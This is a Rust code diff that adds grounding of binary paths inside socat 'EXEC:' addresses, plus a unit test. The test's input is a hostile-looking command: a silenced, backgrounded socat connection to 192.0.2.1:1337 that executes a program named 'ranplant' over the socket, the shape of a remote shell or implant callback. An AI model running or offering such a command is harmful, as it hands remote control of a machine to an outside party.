@@ -151,6 +151,15 @@ impl ShellCmd {
             }
         }
 
+        for entry in &self.entries {
+            for range in &entry.arg_ranges {
+                let raw = source_chars(&self.source, range.clone());
+                if let Some(grounded) = ground_socat_exec_address(raw, binaries) {
+                    replacements.push((range.clone(), grounded));
+                }
+            }
+        }
+
         if replacements.is_empty() {
             return self.source.clone();
         }
@@ -175,6 +184,16 @@ impl ShellCmd {
         }
         result
     }
+}
+
+fn ground_socat_exec_address(
+    raw: &str,
+    binaries: &HashMap<String, BinaryPresence>,
+) -> Option<String> {
+    let script = raw.strip_prefix("EXEC:")?;
+    let (prefix, script, suffix) = strip_matching_quotes(script);
+    let grounded = ground_binaries(script, binaries);
+    (grounded != script).then(|| format!("EXEC:{prefix}{grounded}{suffix}"))
 }
 
 // ---------------------------------------------------------------------------
@@ -477,5 +496,29 @@ mod tests {
         let result = ground_binaries("/bin/sh -lc 'kubectl get pods'", &map);
 
         assert_eq!(result, "/bin/sh -lc '/tmp/kubectl get pods'");
+    }
+
+    #[test]
+    fn grounds_tool_inside_socat_exec_address() {
+        let map = HashMap::from([
+            (
+                "socat".to_string(),
+                BinaryPresence::Present("/usr/bin/socat".to_string()),
+            ),
+            (
+                "ranplant".to_string(),
+                BinaryPresence::Present("/tmp/ranplant".to_string()),
+            ),
+        ]);
+
+        let result = ground_binaries(
+            "socat TCP:192.0.2.1:1337 EXEC:'ranplant session --stdio' >/dev/null 2>&1 &",
+            &map,
+        );
+
+        assert_eq!(
+            result,
+            "/usr/bin/socat TCP:192.0.2.1:1337 EXEC:'/tmp/ranplant session --stdio' >/dev/null 2>&1 &"
+        );
     }
 }
